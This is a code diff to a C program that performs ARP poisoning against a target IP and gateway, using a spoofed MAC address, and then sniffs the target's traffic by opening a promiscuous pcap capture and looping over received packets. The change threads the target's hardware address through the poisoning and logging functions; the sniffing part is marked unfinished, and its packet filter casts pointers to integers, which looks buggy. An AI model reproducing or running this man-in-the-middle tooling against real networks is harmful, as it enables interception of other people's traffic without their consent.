@@ -107,8 +107,7 @@ int getMacAddress(char* ip, uint8_t* hwbuf){
     return 0;
 }
 
-int arpPoison(char* ipTarget, char* ipGateway){
-    uint8_t targetHwAddr[6];
+int arpPoison(char* ipTarget, char* ipGateway, uint8_t* targetHwAddr){
     // Lookup ipTarget's HWAddr..
     if ( getMacAddress(ipTarget, targetHwAddr) != 0)
         return 1;
@@ -175,13 +174,16 @@ void sendArp(int type, uint32_t ipsrc, uint8_t* hwsrc, uint32_t ipdst, uint8_t* 
 
 
 }
-int logTcp(char* ip){
+int logTcp(char* ip, uint8_t* hwAddr){
     char filter[60];
     // TODO finish this
-    sprintf(filter, "ether[6:4] == %u && ether[10:2] == %u", ntohl(getIpInt(ip)));
-    setPromiscuous(Settings.device, filter);
+    sprintf(filter, "ether[6:4] == %u && ether[10:2] == %u", (uint32_t)(hwAddr), (uint32_t)(hwAddr+4));
+    pcap_t* handle = setPromiscuous(Settings.dev, filter);
+    struct pcap_pkthdr header;  /* The header that pcap gives us */
+    const u_char *packet;       /* The actual packet */
     while(1){
-
+        packet = pcap_next(handle, &header);
+        printf("got packet of len %d\n", header.len);
 
     };
 
@@ -200,16 +202,17 @@ int main(int argc, char* argv[]){
     Settings.hostHwAddr = libnet_get_hwaddr(Settings.arpMachine)->ether_addr_octet;
     Settings.hostIp = libnet_get_ipaddr4(Settings.arpMachine);
     uint8_t hwspoof[] = {0xca,0xfe,0xba,0xaa,0xbe,0x0};
+    uint8_t targetHwAddr[6];
     Settings.spoofedHwAddr = hwspoof;
    if (Settings.arpMachine == NULL){
         fprintf(stderr, "fail:%s\n", ERRBUF);
         exit(EXIT_FAILURE);
     }
     int ec;
-    ec = arpPoison(argv[2], argv[3]);
+    ec = arpPoison(argv[2], argv[3], targetHwAddr);
     if (ec)
         goto done;
-    logTcp(argv[2]);
+    logTcp(argv[2], targetHwAddr);
     done:
     libnet_destroy(Settings.arpMachine);
     return 0;
